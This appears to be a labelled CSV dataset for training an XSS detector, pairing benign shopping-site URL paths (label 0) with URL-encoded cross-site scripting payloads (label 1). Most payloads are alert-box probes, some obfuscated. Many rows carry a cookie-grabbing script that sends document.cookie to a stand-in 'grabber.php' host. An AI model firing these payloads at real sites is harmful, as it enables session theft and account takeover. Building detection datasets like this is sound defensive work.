text,label
/user/profile?id=3835&view=summary,0
/api/items?id=720&details=true,0
/api/items?id=173&details=true,0
/products?value1=%3Ciframe%20src%3D%27javascript%3Aalert%281%29%27%3E,1
/api/items?id=912&details=true,0
/api/items?id=835&details=true,0
/cart?username1=%3Cbody%20onload%3Dalert%28%27XSS%27%29%3E,1
/order?phone=%3Ciframe%20src%3D%27javascript%3Aalert%281%29%27%3E,1
/cart?action=update&item=shirt,0
/products?category=groceries&page=10,0
/checkout?username1=%3Cdiv%20onpointerover%3D%22alert%2845%29%22%3EMOVE%20HERE%3C/div%3E,1
/checkout?total=274&currency=USD,0
/cart?password123=%3Cbody%20onload%3Dalert%28%27XSS%27%29%3E,1
/wishlist?item=tablet&action=add,0
/cart?apple=setTimeout%28%27ale%27%2B%27rt%282%29%27%29%3B,1
/order?item=monitor&quantity=70&category=clothing&color=blue,0
/products?category=groceries&page=9,0
/user/profile?id=5581&view=summary&color=white,0
/search?action1=%22%3E%3Cscript%3Ealert%28%27XSS%27%29%3C/script%3E,1
/checkout?book=%3Cbody%20onload%3Dalert%28%27XSS%27%29%3E,1
/user/profile?id=3129&view=summary,0
/user/profile?id=5844&view=summary,0
/cart?action=remove&item=notebook&size=large,0
/search?banana=setTimeout%28%27ale%27%2B%27rt%282%29%27%29%3B,1
/wishlist?item=pen&action=add&color=red&size=small,0
/api/items?id=231&details=true&size=medium,0
/order?laptop=%3Cscript%3Ealert%28%27XSS%27%29%3C/script%3E,1
/user/profile?id=4253&view=summary&size=large,0
/order?apple=%22%3E%3Cscript%3Ealert%28%27XSS%27%29%3C/script%3E,1
/order?item=notebook&quantity=61&category=furniture&size=small,0
/order?item=apple&quantity=35,0
/products?action1=%3Cscript%3Eeval%28%27%5Cx61lert%28%5C%2733%5C%27%29%27%29%3C/script%3E,1
/wishlist?shoes=%3Cbody%20onload%3Dalert%28%27XSS%27%29%3E,1
/cart?phone=%3Ciframe%20src%3D%27javascript%3Aalert%281%29%27%3E,1
/checkout?total=940&currency=USD&color=red,0
/user/profile?id=4597&view=summary,0
/search?q=book&size=medium,0
/checkout?total=163&currency=USD&color=red,0
/products?query=%3Cscript%3Eeval%28%27%5Cx61lert%28%5C%2733%5C%27%29%27%29%3C/script%3E,1
/user/profile?id=5536&view=summary&color=white,0
/api?category1=%3Csvg%20onload%3Dalert%281%29%3E,1
/api?electronics=Function%28%22ale%22%2B%22rt%281%29%22%29%28%29%3B,1
/products?category=clothing&page=5,0
/wishlist?item=bottle&action=add,0
/api?electronics=setTimeout%28%27ale%27%2B%27rt%282%29%27%29%3B,1
/search?q=bottle,0
/order?phone=%3Cscript%3Edocument.location%3D%27http%3A//localhost/XSS/grabber.php%3Fc%3D%27%2Bdocument.cookie%3C/script%3E,1
/search?q=apple&color=white,0
/products?category=furniture&page=9&color=yellow,0
/checkout?action1=%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E,1
/products?category=electronics&page=3&color=green,0
/wishlist?username1=%3Cbody%20onload%3Dalert%28%27XSS%27%29%3E,1
/checkout?search_term=%3Csvg%20onload%3Dalert%281%29%3E,1
/cart?query=%3Cdiv%20onpointerover%3D%22alert%2845%29%22%3EMOVE%20HERE%3C/div%3E,1
/api?password123=%3Cscript%3Edocument.location%3D%27http%3A//localhost/XSS/grabber.php%3Fc%3D%27%2Bdocument.cookie%3C/script%3E,1
/order?query=%3Csvg%20onload%3Dalert%281%29%3E,1
/order?search_term=%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E,1
/search?laptop=%3Cdiv%20onpointerover%3D%22alert%2845%29%22%3EMOVE%20HERE%3C/div%3E,1
/search?action1=%3Cdiv%20onpointerover%3D%22alert%2845%29%22%3EMOVE%20HERE%3C/div%3E,1
/wishlist?search_term=%22%3E%3Cscript%3Ealert%28%27XSS%27%29%3C/script%3E,1
/login?laptop=Function%28%22ale%22%2B%22rt%281%29%22%29%28%29%3B,1
/cart?action=add&item=bottle&size=small,0
/cart?action=remove&item=pen&color=yellow&size=large,0
/products?category=clothing&page=1,0
/cart?query=Function%28%22ale%22%2B%22rt%281%29%22%29%28%29%3B,1
/products?search_term=%22%3E%3Cscript%3Ealert%28%27XSS%27%29%3C/script%3E,1
/user/profile?id=1017&view=summary,0
/products?category=electronics&page=5,0
/api?electronics=Function%28%22ale%22%2B%22rt%281%29%22%29%28%29%3B,1
/wishlist?item=shirt&action=add&color=blue,0
/api?password123=%3Cdiv%20onpointerover%3D%22alert%2845%29%22%3EMOVE%20HERE%3C/div%3E,1
/order?item=phone&quantity=12&category=stationery,0
/search?q=tablet,0
/products?category1=setTimeout%28%27ale%27%2B%27rt%282%29%27%29%3B,1
/checkout?total=199&currency=USD,0
/api/items?id=664&details=true&color=yellow&size=small,0
/products?category=groceries&page=7&color=red,0
/order?item=phone&quantity=56&category=groceries&size=medium,0
/api/items?id=587&details=true,0
/cart?action=update&item=shirt,0
/checkout?apple=%3Cscript%3Eeval%28%27%5Cx61lert%28%5C%2733%5C%27%29%27%29%3C/script%3E,1
/products?category=clothing&page=8&color=white,0
/user/profile?id=6797&view=summary&color=yellow&size=large,0
/checkout?total=142&currency=USD&color=green,0
/products?category=clothing&page=6&size=medium,0
/order?shoes=%3Cdiv%20onpointerover%3D%22alert%2845%29%22%3EMOVE%20HERE%3C/div%3E,1
/wishlist?item=shirt&action=remove,0
/api/items?id=619&details=true&color=red,0
/wishlist?electronics=Function%28%22ale%22%2B%22rt%281%29%22%29%28%29%3B,1
/wishlist?value1=%22%3E%3Cscript%3Ealert%28%27XSS%27%29%3C/script%3E,1
/api?phone=%3Csvg%20onload%3Dalert%281%29%3E,1
/products?category=stationery&page=10&color=black,0
/search?q=clothing,0
/cart?phone=%3Cscript%3Ealert%28%27XSS%27%29%3C/script%3E,1
/login?shoes=%3Csvg%20onload%3Dalert%281%29%3E,1
/wishlist?item=shirt&action=add,0
/wishlist?query=%3Cscript%3Edocument.location%3D%27http%3A//localhost/XSS/grabber.php%3Fc%3D%27%2Bdocument.cookie%3C/script%3E,1
/products?category=stationery&page=10,0
/order?item=chair&quantity=89,0
/checkout?banana=%3Cscript%3Ealert%28%27XSS%27%29%3C/script%3E,1
/products?laptop=%3Cdiv%20onpointerover%3D%22alert%2845%29%22%3EMOVE%20HERE%3C/div%3E,1
/wishlist?laptop=%3Ciframe%20src%3D%27javascript%3Aalert%281%29%27%3E,1
/login?action1=%3Cscript%3Edocument.location%3D%27http%3A//localhost/XSS/grabber.php%3Fc%3D%27%2Bdocument.cookie%3C/script%3E,1
/products?query=%3Cscript%3Edocument.location%3D%27http%3A//localhost/XSS/grabber.php%3Fc%3D%27%2Bdocument.cookie%3C/script%3E,1
/login?action1=%3Cscript%3Ealert%28%27XSS%27%29%3C/script%3E,1
/login?book=%3Cscript%3Edocument.location%3D%27http%3A//localhost/XSS/grabber.php%3Fc%3D%27%2Bdocument.cookie%3C/script%3E,1
/products?category=stationery&page=3&color=blue,0
/cart?action=update&item=book&color=black,0
/checkout?total=829&currency=USD&color=yellow&size=small,0
/wishlist?apple=%3Csvg%20onload%3Dalert%281%29%3E,1
/cart?value1=%3Csvg%20onload%3Dalert%281%29%3E,1
/wishlist?phone=%3Csvg%20onload%3Dalert%281%29%3E,1
/api?banana=%22%3E%3Cscript%3Ealert%28%27XSS%27%29%3C/script%3E,1
/login?phone=%3Ciframe%20src%3D%27javascript%3Aalert%281%29%27%3E,1
/wishlist?electronics=%3Cscript%3Eeval%28%27%5Cx61lert%28%5C%2733%5C%27%29%27%29%3C/script%3E,1
/user/profile?id=4256&view=summary,0
/api/items?id=539&details=true,0
/search?apple=%22%3E%3Cscript%3Ealert%28%27XSS%27%29%3C/script%3E,1
/order?book=setTimeout%28%27ale%27%2B%27rt%282%29%27%29%3B,1
/api?category1=%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E,1
/products?laptop=setTimeout%28%27ale%27%2B%27rt%282%29%27%29%3B,1
/wishlist?password123=%3Cscript%3Edocument.location%3D%27http%3A//localhost/XSS/grabber.php%3Fc%3D%27%2Bdocument.cookie%3C/script%3E,1
/wishlist?electronics=%3Ciframe%20src%3D%27javascript%3Aalert%281%29%27%3E,1
/checkout?total=999&currency=USD,0
/api?phone=%3Cscript%3Edocument.location%3D%27http%3A//localhost/XSS/grabber.php%3Fc%3D%27%2Bdocument.cookie%3C/script%3E,1
/api/items?id=551&details=true,0
/login?username1=%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E,1
/cart?action=remove&item=monitor&color=green&size=medium,0
/products?category=stationery&page=6,0
/api/items?id=832&details=true,0
/search?search_term=%3Cscript%3Edocument.location%3D%27http%3A//localhost/XSS/grabber.php%3Fc%3D%27%2Bdocument.cookie%3C/script%3E,1
/checkout?total=10&currency=USD,0
/order?laptop=%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E,1
/products?category=clothing&page=2,0
/user/profile?id=3838&view=summary,0
/cart?action=remove&item=book&color=green,0
/api/items?id=602&details=true,0
/checkout?category1=%3Ciframe%20src%3D%27javascript%3Aalert%281%29%27%3E,1
/order?item=bottle&quantity=37&category=groceries,0
/search?q=clothing,0
/cart?banana=Function%28%22ale%22%2B%22rt%281%29%22%29%28%29%3B,1
/wishlist?item=pen&action=remove,0
/login?shoes=%3Cscript%3Eeval%28%27%5Cx61lert%28%5C%2733%5C%27%29%27%29%3C/script%3E,1
/products?phone=%3Cscript%3Ealert%28%27XSS%27%29%3C/script%3E,1
/user/profile?id=2328&view=summary,0
/cart?action=view&item=apple&size=small,0
/wishlist?item=bottle&action=add,0
/api?category1=%3Cscript%3Edocument.location%3D%27http%3A//localhost/XSS/grabber.php%3Fc%3D%27%2Bdocument.cookie%3C/script%3E,1
/wishlist?item=tablet&action=add&size=medium,0
/cart?action=view&item=book,0
/order?item=phone&quantity=72&color=red,0
/order?banana=%3Cscript%3Eeval%28%27%5Cx61lert%28%5C%2733%5C%27%29%27%29%3C/script%3E,1
/checkout?total=105&currency=USD,0
/cart?search_term=%3Cscript%3Eeval%28%27%5Cx61lert%28%5C%2733%5C%27%29%27%29%3C/script%3E,1
/api?category1=%3Cbody%20onload%3Dalert%28%27XSS%27%29%3E,1
/search?q=pen&color=red,0
/products?category=groceries&page=1&size=large,0
/checkout?shoes=%22%3E%3Cscript%3Ealert%28%27XSS%27%29%3C/script%3E,1
/api?laptop=Function%28%22ale%22%2B%22rt%281%29%22%29%28%29%3B,1
/checkout?action1=setTimeout%28%27ale%27%2B%27rt%282%29%27%29%3B,1
/checkout?total=803&currency=USD&color=blue&size=large,0
/api?phone=%3Cdiv%20onpointerover%3D%22alert%2845%29%22%3EMOVE%20HERE%3C/div%3E,1
/cart?category1=%3Cscript%3Ealert%28%27XSS%27%29%3C/script%3E,1
/cart?query=%3Cdiv%20onpointerover%3D%22alert%2845%29%22%3EMOVE%20HERE%3C/div%3E,1
/wishlist?item=phone&action=add&color=green&size=medium,0
/order?item=shirt&quantity=71&category=clothing,0
/order?electronics=%3Cscript%3Edocument.location%3D%27http%3A//localhost/XSS/grabber.php%3Fc%3D%27%2Bdocument.cookie%3C/script%3E,1
/wishlist?password123=%3Cscript%3Edocument.location%3D%27http%3A//localhost/XSS/grabber.php%3Fc%3D%27%2Bdocument.cookie%3C/script%3E,1
/wishlist?item=chair&action=remove&color=green,0
/order?username1=%3Cdiv%20onpointerover%3D%22alert%2845%29%22%3EMOVE%20HERE%3C/div%3E,1
/search?action1=Function%28%22ale%22%2B%22rt%281%29%22%29%28%29%3B,1
/search?q=monitor,0
/api?value1=%3Cdiv%20onpointerover%3D%22alert%2845%29%22%3EMOVE%20HERE%3C/div%3E,1
/wishlist?item=book&action=add&color=red,0
/cart?action=add&item=phone,0
/checkout?electronics=Function%28%22ale%22%2B%22rt%281%29%22%29%28%29%3B,1
/wishlist?item=notebook&action=add&color=black&size=medium,0
/order?action1=%3Cscript%3Edocument.location%3D%27http%3A//localhost/XSS/grabber.php%3Fc%3D%27%2Bdocument.cookie%3C/script%3E,1
/checkout?total=770&currency=USD&size=medium,0
/checkout?total=95&currency=USD,0
/products?category=groceries&page=1&size=large,0
/order?value1=%3Csvg%20onload%3Dalert%281%29%3E,1
/checkout?total=45&currency=USD,0
/api?laptop=%3Cdiv%20onpointerover%3D%22alert%2845%29%22%3EMOVE%20HERE%3C/div%3E,1
/login?username1=%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E,1
/login?banana=%22%3E%3Cscript%3Ealert%28%27XSS%27%29%3C/script%3E,1
/checkout?total=306&currency=USD&color=green,0
/api/items?id=445&details=true,0
/wishlist?item=chair&action=add,0
/search?value1=%3Csvg%20onload%3Dalert%281%29%3E,1
/products?category1=%3Cbody%20onload%3Dalert%28%27XSS%27%29%3E,1
/cart?electronics=%3Csvg%20onload%3Dalert%281%29%3E,1
/search?value1=%3Csvg%20onload%3Dalert%281%29%3E,1
/api?category1=%3Cdiv%20onpointerover%3D%22alert%2845%29%22%3EMOVE%20HERE%3C/div%3E,1
/checkout?banana=%3Cscript%3Ealert%28%27XSS%27%29%3C/script%3E,1
/search?phone=%3Ciframe%20src%3D%27javascript%3Aalert%281%29%27%3E,1
/checkout?electronics=%3Cscript%3Eeval%28%27%5Cx61lert%28%5C%2733%5C%27%29%27%29%3C/script%3E,1
/api/items?id=267&details=true,0
/search?q=notebook,0
/wishlist?item=pen&action=remove,0
/cart?action=update&item=apple,0
/wishlist?phone=%3Cscript%3Edocument.location%3D%27http%3A//localhost/XSS/grabber.php%3Fc%3D%27%2Bdocument.cookie%3C/script%3E,1
/search?username1=setTimeout%28%27ale%27%2B%27rt%282%29%27%29%3B,1
/user/profile?id=1847&view=summary&color=white,0
/cart?value1=%3Ciframe%20src%3D%27javascript%3Aalert%281%29%27%3E,1
/order?password123=%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E,1
/checkout?total=200&currency=USD&color=red,0
/cart?action=remove&item=monitor&size=medium,0
/api?book=%3Cscript%3Ealert%28%27XSS%27%29%3C/script%3E,1
/search?laptop=%3Cscript%3Edocument.location%3D%27http%3A//localhost/XSS/grabber.php%3Fc%3D%27%2Bdocument.cookie%3C/script%3E,1
/login?shoes=Function%28%22ale%22%2B%22rt%281%29%22%29%28%29%3B,1
/products?category=furniture&page=10&size=medium,0
/api?action1=%3Cdiv%20onpointerover%3D%22alert%2845%29%22%3EMOVE%20HERE%3C/div%3E,1
/checkout?total=73&currency=USD,0
/api?category1=%3Cscript%3Eeval%28%27%5Cx61lert%28%5C%2733%5C%27%29%27%29%3C/script%3E,1
/login?apple=%3Cscript%3Eeval%28%27%5Cx61lert%28%5C%2733%5C%27%29%27%29%3C/script%3E,1
/cart?category1=%3Csvg%20onload%3Dalert%281%29%3E,1
/wishlist?item=bottle&action=remove,0
/user/profile?id=7632&view=summary,0
/search?q=book,0
/products?value1=%3Cscript%3Edocument.location%3D%27http%3A//localhost/XSS/grabber.php%3Fc%3D%27%2Bdocument.cookie%3C/script%3E,1
/api?value1=%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E,1
/api?query=%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E,1
/login?category1=%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E,1
/wishlist?query=%3Cbody%20onload%3Dalert%28%27XSS%27%29%3E,1
/wishlist?item=notebook&action=remove,0
/login?shoes=%3Ciframe%20src%3D%27javascript%3Aalert%281%29%27%3E,1
/search?q=clothing,0
/wishlist?item=shirt&action=remove&color=blue&size=medium,0
/products?category=furniture&page=4,0
/cart?action=add&item=monitor,0
/products?category=furniture&page=2,0
/order?query=%3Csvg%20onload%3Dalert%281%29%3E,1
/wishlist?phone=%3Cscript%3Eeval%28%27%5Cx61lert%28%5C%2733%5C%27%29%27%29%3C/script%3E,1
/wishlist?item=phone&action=add,0
/checkout?total=356&currency=USD&size=large,0
/search?banana=%3Ciframe%20src%3D%27javascript%3Aalert%281%29%27%3E,1
/search?apple=Function%28%22ale%22%2B%22rt%281%29%22%29%28%29%3B,1
/login?category1=%22%3E%3Cscript%3Ealert%28%27XSS%27%29%3C/script%3E,1
/api/items?id=398&details=true,0
/wishlist?item=pen&action=remove,0
/order?action1=%3Ciframe%20src%3D%27javascript%3Aalert%281%29%27%3E,1
/order?item=shirt&quantity=53,0
/order?value1=%3Cdiv%20onpointerover%3D%22alert%2845%29%22%3EMOVE%20HERE%3C/div%3E,1
/checkout?category1=%3Cbody%20onload%3Dalert%28%27XSS%27%29%3E,1
/search?q=chair&color=black&size=large,0
/login?password123=Function%28%22ale%22%2B%22rt%281%29%22%29%28%29%3B,1
/checkout?category1=%3Cdiv%20onpointerover%3D%22alert%2845%29%22%3EMOVE%20HERE%3C/div%3E,1
/api?electronics=%3Cscript%3Ealert%28%27XSS%27%29%3C/script%3E,1
/products?category=groceries&page=4&color=yellow,0
/user/profile?id=4614&view=summary,0
/cart?laptop=Function%28%22ale%22%2B%22rt%281%29%22%29%28%29%3B,1
/search?q=stationery,0
/products?phone=%3Cdiv%20onpointerover%3D%22alert%2845%29%22%3EMOVE%20HERE%3C/div%3E,1
/order?item=monitor&quantity=39,0
/order?item=apple&quantity=76&category=furniture,0
/order?category1=%3Ciframe%20src%3D%27javascript%3Aalert%281%29%27%3E,1
/api/items?id=567&details=true&color=red,0
/wishlist?item=phone&action=add&color=red&size=small,0
/cart?book=%3Cscript%3Edocument.location%3D%27http%3A//localhost/XSS/grabber.php%3Fc%3D%27%2Bdocument.cookie%3C/script%3E,1
/login?action1=%22%3E%3Cscript%3Ealert%28%27XSS%27%29%3C/script%3E,1
/order?book=Function%28%22ale%22%2B%22rt%281%29%22%29%28%29%3B,1
/products?category=stationery&page=10&color=yellow,0
/login?category1=%3Cbody%20onload%3Dalert%28%27XSS%27%29%3E,1
/products?category=stationery&page=3&size=small,0
/api?value1=%3Cscript%3Edocument.location%3D%27http%3A//localhost/XSS/grabber.php%3Fc%3D%27%2Bdocument.cookie%3C/script%3E,1
/wishlist?password123=%3Cbody%20onload%3Dalert%28%27XSS%27%29%3E,1
/order?password123=%22%3E%3Cscript%3Ealert%28%27XSS%27%29%3C/script%3E,1
/order?search_term=%3Cscript%3Eeval%28%27%5Cx61lert%28%5C%2733%5C%27%29%27%29%3C/script%3E,1
/wishlist?item=bottle&action=remove&color=red,0
/cart?banana=%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E,1
/products?category=clothing&page=5,0
/cart?category1=%3Ciframe%20src%3D%27javascript%3Aalert%281%29%27%3E,1
/products?value1=%3Cscript%3Ealert%28%27XSS%27%29%3C/script%3E,1
/products?category=stationery&page=9,0
/cart?action=view&item=monitor,0
/api?phone=%3Csvg%20onload%3Dalert%281%29%3E,1
/user/profile?id=6811&view=summary&color=yellow,0
/order?book=%3Cscript%3Ealert%28%27XSS%27%29%3C/script%3E,1
/checkout?book=%3Cscript%3Edocument.location%3D%27http%3A//localhost/XSS/grabber.php%3Fc%3D%27%2Bdocument.cookie%3C/script%3E,1
/wishlist?item=shirt&action=add,0
/user/profile?id=5968&view=summary,0
/products?laptop=%3Cscript%3Edocument.location%3D%27http%3A//localhost/XSS/grabber.php%3Fc%3D%27%2Bdocument.cookie%3C/script%3E,1
/products?laptop=Function%28%22ale%22%2B%22rt%281%29%22%29%28%29%3B,1
/products?electronics=%3Cscript%3Ealert%28%27XSS%27%29%3C/script%3E,1
/cart?action=remove&item=shirt&color=yellow,0
/search?value1=setTimeout%28%27ale%27%2B%27rt%282%29%27%29%3B,1
/wishlist?laptop=%3Cbody%20onload%3Dalert%28%27XSS%27%29%3E,1
/user/profile?id=4637&view=summary&size=large,0
/products?category=stationery&page=1&size=medium,0
/search?phone=%3Csvg%20onload%3Dalert%281%29%3E,1
/login?search_term=%3Cdiv%20onpointerover%3D%22alert%2845%29%22%3EMOVE%20HERE%3C/div%3E,1
/products?category=furniture&page=3&size=medium,0
/checkout?laptop=%22%3E%3Cscript%3Ealert%28%27XSS%27%29%3C/script%3E,1
/checkout?total=823&currency=USD,0
/search?q=electronics&color=green,0
/products?search_term=%3Cscript%3Eeval%28%27%5Cx61lert%28%5C%2733%5C%27%29%27%29%3C/script%3E,1
/wishlist?item=pen&action=remove&size=large,0
/order?search_term=%3Cscript%3Eeval%28%27%5Cx61lert%28%5C%2733%5C%27%29%27%29%3C/script%3E,1
/cart?action=view&item=chair&color=red,0
/products?category=groceries&page=2,0
/products?category=furniture&page=6&color=red,0
/checkout?action1=%3Cbody%20onload%3Dalert%28%27XSS%27%29%3E,1
/user/profile?id=7867&view=summary,0
/search?q=shirt&color=black,0
/order?item=tablet&quantity=70,0
/products?category=electronics&page=2,0
/products?password123=%3Csvg%20onload%3Dalert%281%29%3E,1
/products?category=groceries&page=10&color=blue&size=medium,0
/wishlist?item=tablet&action=add&color=red,0
/user/profile?id=2883&view=summary,0
/order?phone=%3Cscript%3Edocument.location%3D%27http%3A//localhost/XSS/grabber.php%3Fc%3D%27%2Bdocument.cookie%3C/script%3E,1
/cart?apple=%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E,1
/order?value1=Function%28%22ale%22%2B%22rt%281%29%22%29%28%29%3B,1
/checkout?total=476&currency=USD,0
/search?value1=%3Cdiv%20onpointerover%3D%22alert%2845%29%22%3EMOVE%20HERE%3C/div%3E,1
/wishlist?action1=%3Cbody%20onload%3Dalert%28%27XSS%27%29%3E,1
/search?q=electronics,0
/products?action1=%3Csvg%20onload%3Dalert%281%29%3E,1
/search?banana=%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E,1
/products?password123=%3Cbody%20onload%3Dalert%28%27XSS%27%29%3E,1
/products?shoes=%3Csvg%20onload%3Dalert%281%29%3E,1
/products?category=stationery&page=10&color=blue,0
/wishlist?query=%3Cscript%3Edocument.location%3D%27http%3A//localhost/XSS/grabber.php%3Fc%3D%27%2Bdocument.cookie%3C/script%3E,1
/checkout?total=542&currency=USD&color=red,0
/search?q=pen,0
/cart?banana=Function%28%22ale%22%2B%22rt%281%29%22%29%28%29%3B,1
/search?q=notebook&size=small,0
/wishlist?query=%3Cbody%20onload%3Dalert%28%27XSS%27%29%3E,1
/checkout?total=87&currency=USD,0
/checkout?total=271&currency=USD,0
/api/items?id=878&details=true&size=medium,0
/wishlist?item=pen&action=remove&size=small,0
/api?electronics=setTimeout%28%27ale%27%2B%27rt%282%29%27%29%3B,1
/checkout?query=%3Csvg%20onload%3Dalert%281%29%3E,1
/order?category1=%3Cscript%3Edocument.location%3D%27http%3A//localhost/XSS/grabber.php%3Fc%3D%27%2Bdocument.cookie%3C/script%3E,1
/search?search_term=%3Cbody%20onload%3Dalert%28%27XSS%27%29%3E,1
/api?action1=%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E,1
/user/profile?id=8537&view=summary,0
/cart?query=%3Cscript%3Edocument.location%3D%27http%3A//localhost/XSS/grabber.php%3Fc%3D%27%2Bdocument.cookie%3C/script%3E,1
/cart?apple=%3Cdiv%20onpointerover%3D%22alert%2845%29%22%3EMOVE%20HERE%3C/div%3E,1
/products?electronics=%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E,1
/products?category=stationery&page=6,0
/search?banana=%22%3E%3Cscript%3Ealert%28%27XSS%27%29%3C/script%3E,1
/search?q=pen&size=medium,0
/cart?action=view&item=phone,0
/api?electronics=setTimeout%28%27ale%27%2B%27rt%282%29%27%29%3B,1
/wishlist?item=apple&action=remove,0
/api?electronics=%3Ciframe%20src%3D%27javascript%3Aalert%281%29%27%3E,1
/user/profile?id=4127&view=summary,0
/search?electronics=%3Cdiv%20onpointerover%3D%22alert%2845%29%22%3EMOVE%20HERE%3C/div%3E,1
/wishlist?item=tablet&action=remove,0
/wishlist?item=pen&action=add,0
/login?banana=%3Cscript%3Eeval%28%27%5Cx61lert%28%5C%2733%5C%27%29%27%29%3C/script%3E,1
/checkout?query=Function%28%22ale%22%2B%22rt%281%29%22%29%28%29%3B,1
/search?category1=%3Ciframe%20src%3D%27javascript%3Aalert%281%29%27%3E,1
/user/profile?id=7201&view=summary&size=medium,0
/api/items?id=399&details=true&color=blue,0
/login?action1=%3Cscript%3Ealert%28%27XSS%27%29%3C/script%3E,1
/cart?category1=%3Ciframe%20src%3D%27javascript%3Aalert%281%29%27%3E,1
/search?password123=%3Cdiv%20onpointerover%3D%22alert%2845%29%22%3EMOVE%20HERE%3C/div%3E,1
/user/profile?id=6827&view=summary&color=white,0
/wishlist?password123=Function%28%22ale%22%2B%22rt%281%29%22%29%28%29%3B,1
/api/items?id=324&details=true,0
/checkout?shoes=%3Cscript%3Eeval%28%27%5Cx61lert%28%5C%2733%5C%27%29%27%29%3C/script%3E,1
/user/profile?id=3935&view=summary&color=black,0
/checkout?apple=%3Cscript%3Ealert%28%27XSS%27%29%3C/script%3E,1
/products?category=stationery&page=1&color=white,0
/products?category=clothing&page=1,0
/search?q=stationery,0
/api/items?id=635&details=true&size=small,0
/wishlist?item=phone&action=add,0
/products?category=electronics&page=5,0
/order?laptop=%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E,1
/cart?query=%3Ciframe%20src%3D%27javascript%3Aalert%281%29%27%3E,1
/order?item=monitor&quantity=43,0
/cart?search_term=%3Cscript%3Eeval%28%27%5Cx61lert%28%5C%2733%5C%27%29%27%29%3C/script%3E,1
/cart?action=remove&item=pen,0
/cart?action=remove&item=chair,0
/products?electronics=%3Ciframe%20src%3D%27javascript%3Aalert%281%29%27%3E,1
/order?password123=%3Cdiv%20onpointerover%3D%22alert%2845%29%22%3EMOVE%20HERE%3C/div%3E,1
/user/profile?id=6481&view=summary,0
/products?apple=%3Ciframe%20src%3D%27javascript%3Aalert%281%29%27%3E,1
/login?search_term=%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E,1
/login?search_term=%3Ciframe%20src%3D%27javascript%3Aalert%281%29%27%3E,1
/search?q=notebook,0
/search?value1=%3Ciframe%20src%3D%27javascript%3Aalert%281%29%27%3E,1
/wishlist?banana=setTimeout%28%27ale%27%2B%27rt%282%29%27%29%3B,1
/checkout?shoes=Function%28%22ale%22%2B%22rt%281%29%22%29%28%29%3B,1
/products?electronics=setTimeout%28%27ale%27%2B%27rt%282%29%27%29%3B,1
/checkout?total=581&currency=USD&color=black,0
/checkout?action1=setTimeout%28%27ale%27%2B%27rt%282%29%27%29%3B,1
/api/items?id=833&details=true&size=medium,0
/order?electronics=%3Cbody%20onload%3Dalert%28%27XSS%27%29%3E,1
/wishlist?item=tablet&action=add,0
/order?password123=%3Cdiv%20onpointerover%3D%22alert%2845%29%22%3EMOVE%20HERE%3C/div%3E,1
/wishlist?username1=%3Cdiv%20onpointerover%3D%22alert%2845%29%22%3EMOVE%20HERE%3C/div%3E,1
/search?value1=%22%3E%3Cscript%3Ealert%28%27XSS%27%29%3C/script%3E,1
/checkout?category1=Function%28%22ale%22%2B%22rt%281%29%22%29%28%29%3B,1
/wishlist?item=chair&action=add,0
/login?action1=%3Cdiv%20onpointerover%3D%22alert%2845%29%22%3EMOVE%20HERE%3C/div%3E,1
/order?item=chair&quantity=23&category=electronics&size=small,0
/user/profile?id=8208&view=summary,0
/checkout?total=324&currency=USD,0
/wishlist?shoes=%3Cbody%20onload%3Dalert%28%27XSS%27%29%3E,1
/search?apple=%3Cdiv%20onpointerover%3D%22alert%2845%29%22%3EMOVE%20HERE%3C/div%3E,1
/wishlist?item=chair&action=add,0
/api/items?id=830&details=true&size=small,0
/order?password123=%22%3E%3Cscript%3Ealert%28%27XSS%27%29%3C/script%3E,1
/products?category=furniture&page=1&color=blue,0
/search?q=stationery,0
/order?item=chair&quantity=51&color=green,0
